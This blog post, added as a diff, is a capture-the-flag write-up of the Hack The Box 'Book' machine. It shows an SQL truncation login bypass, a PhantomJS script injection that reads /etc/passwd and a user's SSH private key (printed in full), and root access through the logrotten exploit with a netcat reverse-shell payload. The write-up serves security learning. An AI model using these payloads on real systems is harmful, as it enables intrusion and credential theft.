@@ -1,0 +1,405 @@
+---
+layout: post
+title:  "Hack The Box - Book"
+date:   2020-07-12 10:31:00 +0800
+categories: hackthebox sql phantomjs logrotten linux ssh
+---
+
+![](/assets/images/book.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+{% highlight bash %}
+$ echo "10.10.10.176 book.htb" >> /etc/hosts
+{% endhighlight %}
+
+# Reconnaissance
+
+Using `nmap`, we are able to determine the open ports and running services on the machine.
+{% highlight bash %}
+$ nmap -sV -sT -sC -T5 book.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 04:27 EDT
+Nmap scan report for book.htb (10.10.10.176)
+Host is up (0.24s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
+|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
+|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: LIBRARY - Read | Learn | Have Fun
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds
+
+{% endhighlight %}
+
+# Enumeration (1)
+
+Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, maybe lets see what it has to offer ?
+
+
+`http://book.htb/`:
+
+![](/assets/images/book1.png)
+
+We don't have an account but lets sign up for one.
+
+![](/assets/images/book2.png)
+
+Logging in brings us to what seems to be an online book collection.
+
+`http://book.htb/home.php`:
+
+![](/assets/images/book3.png)
+
+There was a page where we could upload our own books but it will be subjected to approval, which I believe is by the admin.
+
+`http://book.htb/collections.php`:
+
+![](/assets/images/book4.png)
+
+We also see found the admin's email `admin@book.htb`.
+
+`http://book.htb/contact.php`:
+
+![](/assets/images/book5.png)
+
+It took a while to look for a possible vector into the box but I happened to chance upon something on the login/register page where I saw a certain segment in the `javascript` code where it does the validation of the user's input when registering.
+
+`http://book.htb/`:
+{% highlight javascript %}
+function validateForm() {
+  var x = document.forms["myForm"]["name"].value;
+  var y = document.forms["myForm"]["email"].value;
+  if (x == "") {
+    alert("Please fill name field. Should not be more than 10 characters");
+    return false;
+  }
+  if (y == "") {
+    alert("Please fill email field. Should not be more than 20 characters");
+    return false;
+  }
+}
+{% endhighlight %}
+
+This validation code is poorly implemented as even though the alerts informs the user of the character limit, it does not enforce it. Lets check if this is enfored on the server side. I decided to register a new account but with an email of length 21, `admin@book.htb1234567`.
+
+![](/assets/images/book7.png)
+
+After submitting the above request, I tried to logging in but failed due to wrong credentials. Is it possible that my email was truncated? I tried logging in one more time but with one character less, `admin@book.htb123456`, and was successful! This seems like it is vulnerable to [`SQL Truncation Attack`](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html). 
+
+If we try registering with the email `admin@book.htb%20%20%20%20%20%201` and logging it with it, we login as `admin@book.htb`!
+
+![](/assets/images/book8.png)
+
+However, not much can be done but perhaps there is an admin page somewhere so lets brute-force some directories with `gobuster`!
+
+{% highlight bash %}
+$ gobuster dir -u http://book.htb/ -w /usr/share/wordlists/dirb/big.txt -t 12 -k -x .php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://book.htb/
+[+] Threads:        12
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403                                                                   	                                                                     
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/04/09 12:41:45 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/admin (Status: 301)
+/books.php (Status: 302)
+/collections.php (Status: 302)
+/contact.php (Status: 302)
+/db.php (Status: 200)
+/docs (Status: 301)
+/download.php (Status: 302)
+/feedback.php (Status: 302)
+/home.php (Status: 302)
+/images (Status: 301)
+/index.php (Status: 200)
+/logout.php (Status: 302)
+/profile.php (Status: 302)
+/search.php (Status: 302)
+/server-status (Status: 403)
+/settings.php (Status: 302)
+===============================================================
+2020/04/09 12:51:57 Finished
+===============================================================
+{% endhighlight %}
+
+Seems like `/admin` is what we are looking for.
+
+![](/assets/images/book9.png)
+
+Fortunately for us, we already have the admin credentials so lets just login with it. However, there was only one page that caught my attention.
+
+`http://book.htb/admin/collections.php`. 
+
+![](/assets/images/book10.png)
+
+Clicking on the `PDF` link beside `User` will download a `.pdf` file containing a list of the usernames and emails in a table. Likewise, for the `PDF` link beside `Collections` will download a `.pdf` file containing the list of books on the website.
+
+![](/assets/images/book11.png)
+
+It seems like the `.pdf` files are generated on the fly but the question is how? I tried inject all sort of values but something stuck out: `HTML` tags. Apparently, `HTML` tags are being rendered when generating the `pdf` files. This is what happens when I change my username to `<h1>I am a H1</h1>`:
+
+![](/assets/images/book12.png)
+
+Interesting... Lets see if we can perform `SSRF` with this:
+
+First I start a `nc` server on port 80 to receive the web request.
+
+{% highlight bash %}
+$ nc -lvnp 80
+listening on [any] 80 ...
+{% endhighlight %}
+
+I then change my username to `<img src ="http://10.10.XX.XX">` and download the `.pdf` again. Sadly I did not get any request, probably because the name was truncated to probably 10 characters if you remember from registration validation code. Lets try to submit a book and use the `PDF` link for `Collections`.
+
+This time, I put `<img src ="http://10.10.XX.XX">` as the Book Title, uploaded a random file and then download the `.pdf` file.
+
+On my `nc`, I caught the raw web request:
+{% highlight raw %}
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 55942
+GET / HTTP/1.1
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Accept: */*
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en,*
+Host: 10.10.XX.XX
+{% endhighlight %}
+
+`SSRF` was successful but what caught my eye was the `PhantomJS` in the User-Agent header. 
+
+{% highlight raw %}
+PhantomJS is a headless web browser scriptable with JavaScript. It runs on Windows, macOS, Linux, and FreeBSD.
+
+Using QtWebKit as the back-end, it offers fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG.
+
+The following simple script for PhantomJS loads Google homepage, waits a bit, and then captures it to an image.
+{% endhighlight %}
+
+# Exploitation (1)
+
+From this [link](https://coderwall.com/p/5vmo1g/use-phantomjs-to-create-pdfs-from-html), it states that `PhantomJS` has the function to create PDFs from HTML. Cool! To exploit this, I followed this [guide](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/) to read the `/etc/passwd` file.
+
+Submitting the following as my Book Title:
+{% highlight html %}
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script> 
+{% endhighlight %}
+
+Returns this `pdf`:
+
+![](/assets/images/book13.png)
+
+Hmm...There is the `ssh` service running on the machine and there is a user called `reader` with the home directory at `/home/reader`. Lets see if we can find any private keys in `/home/reader/.ssh`, which are typically named as `id_rsa`.
+
+{% highlight html %}
+<script>x=new XMLHttpRequest;x.onload=function(){document.write('<script>x=new XMLHttpRequest;x.onload=function(){document.write('<p style="width:100%; word-wrap: break-word;">' + this.responseText + '</p>')};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
+{% endhighlight %}
+
+Notice that I had to specify width of `100%` and `break-word`. This is because the key was too long and parts of the key will be missed out if I didn't.
+
+![](/assets/images/book14.png)
+
+I then used `pdftotext` to convert the PDF to text:
+
+{% highlight bash %}
+$ pdftotext 19868.pdf 
+{% endhighlight %}
+
+Because of the `break-word`, you will need to manually remove the newlines to fix the private key.
+
+{% highlight bash %}
+$ cat 19868.txt
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
+G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
+WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
+ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
+7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
+75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
+3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
+McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
+tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
+jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
+7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
+GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
+E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
+ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
+SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
+skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
+o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
+Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
+hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
+Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
+sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
+tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
+5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
+y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
+nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4= 
+-----END RSA PRIVATE KEY-----
+{% endhighlight %}
+
+# user.txt
+
+Using the private key, we can `ssh` into the box.
+
+{% highlight raw %}
+$ chmod 700 19868.txt
+$ ssh -i 19868.txt reader@book.htb
+reader@book:~$ cat user.txt 
+51c1XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+
+# Enumeration (2)
+
+In the home directory was
+
+I first uploaded [`pspy`](https://github.com/DominicBreuker/pspy) to `/tmp` so that I could monitor for processes.
+
+{% highlight bash %}
+reader@book:/tmp$ wget http://10.10.XX.XX/pspy
+--2020-07-11 11:40:51--  http://10.10.XX.XX/pspy
+Connecting to 10.10.XX.XX:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1090528 (1.0M) [application/octet-stream]
+Saving to: ‘pspy’
+
+pspy                                                    100%[===============================================================================================================================>]   1.04M   584KB/s    in 1.8s    
+
+2020-07-11 11:40:54 (584 KB/s) - ‘pspy’ saved [1090528/1090528]
+
+reader@book:/tmp$ chmod +x pspy && ./pspy
+...
+2020/07/11 11:50:22 CMD: UID=0    PID=48727  | /usr/sbin/logrotate -f /root/log.cfg 
+{% endhighlight %}
+
+`logrotate` was being ran from time to time as `root` and its version was outdated!
+
+{% highlight bash %}
+reader@book:/tmp$ logrotate --version
+logrotate 3.11.0
+{% endhighlight %}
+
+
+# Exploitation (2)
+
+According to this [`link`](https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html), `logrotate` version `3.15.1` and below are vulnerable to an exploit called `logrotten`.
+
+{% highlight bash %}
+reader@book:/tmp$ wget http://10.10.XX.XX/logrotten.c
+--2020-07-11 12:43:27--  http://10.10.14.7/logrotten.c
+Connecting to 10.10.14.7:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5796 (5.7K) [text/plain]
+Saving to: ‘logrotten.c’
+
+logrotten.c                                             100%[===============================================================================================================================>]   5.66K  --.-KB/s    in 0.006s  
+
+2020-07-11 12:43:27 (975 KB/s) - ‘logrotten.c’ saved [5796/5796]
+
+reader@book:/tmp$ gcc logrotten.c 
+reader@book:/tmp$ gcc logrotten.c -o logrotten
+reader@book:/tmp$ ./logrotten 
+usage: logrotten [OPTION...] <logfile>
+  -h  --help                 Print this help               
+  -t  --targetdir <dir>      Abosulte path to the target directory
+  -p  --payloadfile <file>   File that contains the payload
+  -s  --sleep <sec>          Wait before writing the payload
+  -d  --debug                Print verbose debug messages  
+  -c  --compress             Hijack compressed files instead of created logfiles
+  -o  --open                 Use IN_OPEN instead of IN_MOVED_FROM
+{% endhighlight %}
+
+To use `logrotten`, we need to prepare a script that will act as our payload.  
+
+{% highlight bash %}
+cat payloadfile
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.XX.XX 1337 >/tmp/f
+{% endhighlight %}
+
+The above script creates a reverse shell connection back to us, so need to prepare a listener as well using `nc`.
+
+{% highlight bash %}
+$ nc -lvnp 1337
+listening on [any] 1337 ...
+{% endhighlight %}
+
+Lastly, we will need to target a suitable log file that is configured to create a new copy of itself when rotated. Coincidentially, there was a `access.log` in `/home/reader/backups/`. Echoing a line into it causes it to rotate immediately!
+
+{% highlight bash %}
+reader@book:~/backups$ ls -al 
+total 8
+drwxr-xr-x 2 reader reader 4096 Jul 11 13:58 .
+drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
+-rw-r--r-- 1 reader reader    0 Jul 11 13:42 access.log
+reader@book:~/backups$ echo something >> access.log
+reader@book:~/backups$ ls -al 
+total 12
+drwxr-xr-x 2 reader reader 4096 Jul 11 13:59 .
+drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
+-rw-r--r-- 1 reader reader    0 Jul 11 13:59 access.log
+-rw-r--r-- 1 reader reader   10 Jul 11 13:59 access.log.1
+{% endhighlight %}
+
+To execute `logrotten` successfully, I will need to start another `ssh` session that will echo the line into `access.log` while my current `ssh` session will execute `logrotten`.
+
+On current `ssh` session:
+
+{% highlight bash %}
+reader@book:/tmp$ ./logrotten -p payloadfile /home/reader/backups/access.log
+Waiting for rotating /home/reader/backups/access.log...
+{% endhighlight %}
+
+On another `ssh` session:
+
+{% highlight bash %}
+reader@book:~/backups$ echo something >> access.log
+{% endhighlight %}
+
+On current `ssh` session again:
+{% highlight bash %}
+Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
+Waiting 1 seconds before writing payload...
+Done!
+{% endhighlight %}
+
+# root.txt
+
+`logrotten` has successfully created a symbolic link of our payload to `/etc/bash_completion.d`, so now we just need to run `/bin/bash` to force the execution of our payload and voila, we caught the shell as root!
+
+{% highlight bash %}
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 49512
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+84daXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+
+
+Rooted ! Thank you for reading and look forward for more writeups and articles !    
